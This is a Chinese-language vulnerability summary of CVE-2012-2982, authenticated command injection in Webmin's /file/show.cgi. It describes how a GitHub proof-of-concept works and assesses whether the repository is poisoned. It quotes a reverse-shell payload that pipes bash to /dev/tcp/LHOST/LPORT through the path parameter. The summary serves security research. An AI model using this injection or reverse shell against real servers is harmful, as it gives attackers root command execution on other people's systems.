## CVE-2012-2982 - Webmin 远程命令执行 (RCE)

**漏洞编号:** CVE-2012-2982

**漏洞类型:** 远程命令执行 (RCE)

**影响应用:** Webmin

**危害等级:** 高 (High)

**CVSS评分:** CVSS:2.0/AV:N/AC:L/Au:S/C:C/I:C/A:C (Score: 9.0)

**影响版本:** Webmin 1.590 及更早版本

**利用条件:** 需要经过身份验证的用户权限，且该用户需拥有访问“文件管理器 (File Manager)”模块的权限。

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 10%

## 详情

POC有效性分析：该POC脚本针对Webmin早期版本中的/file/show.cgi组件漏洞编写。通过代码审计发现，该漏洞的核心在于Webmin在处理特定路径名时未对无效字符（如管道符'|'）进行充分过滤，导致攻击者可以通过精心构造的请求在目标服务器上以root权限执行任意系统命令。POC利用逻辑分为两步：首先，脚本通过POST请求访问/session_login.cgi进行登录尝试，成功后获取名为'sid'的Session ID，这证明了攻击者必须持有有效凭证。其次，脚本利用获取的sid构造一个针对/file/show.cgi的特殊请求。在路径参数中注入了bash交互式反弹Shell的Payload：'bash -c 'exec bash -i &>/dev/tcp/LHOST/LPORT <&1'。由于Webmin后端处理逻辑将该路径作为系统调用的一部分，导致注入的命令被直接执行。从代码质量看，脚本使用了Python的requests库处理网络通信，逻辑清晰，包含了基础的随机字符生成（用于混淆Payload特征）和登录检查机制，功能闭环且易于在测试环境中复现。投毒风险分析：经过对提供的exploit.py、requirements.txt和README.md进行深入安全审查，未发现明显的恶意混淆或后门植入迹象。脚本引用的第三方库仅为标准的requests和secrets（用于生成随机字符串），不涉及敏感系统调用或恶意的远程资源加载。虽然脚本中包含反弹Shell的代码，但这属于POC功能的正常组成部分，用于验证漏洞利用的成功与否，而非针对执行者机器的攻击。代码采用了明文编写，没有使用base64、exec或eval等常见的投毒混淆手段。依赖文件requirements.txt中指定的secrets库虽然在现代Python3中是内置的，但该POC通过pip安装是为了兼容性考虑，并不构成安全威胁。唯一的低风险点在于用户需手动克隆GitHub仓库并运行，如果上游仓库遭到篡改，可能引入风险。在防御性研究中使用此POC时，建议在隔离的沙箱环境中运行，并监控其外发的流量目的地，确保其仅作用于指定的目标IP。整体而言，该POC是一个标准的安全研究工具，投毒风险极低。

**项目地址:** [https://github.com/OstojaOfficial/CVE-2012-2982.git](https://github.com/OstojaOfficial/CVE-2012-2982.git)

**漏洞详情:** [https://nvd.nist.gov/vuln/detail/CVE-2012-2982](https://nvd.nist.gov/vuln/detail/CVE-2012-2982)
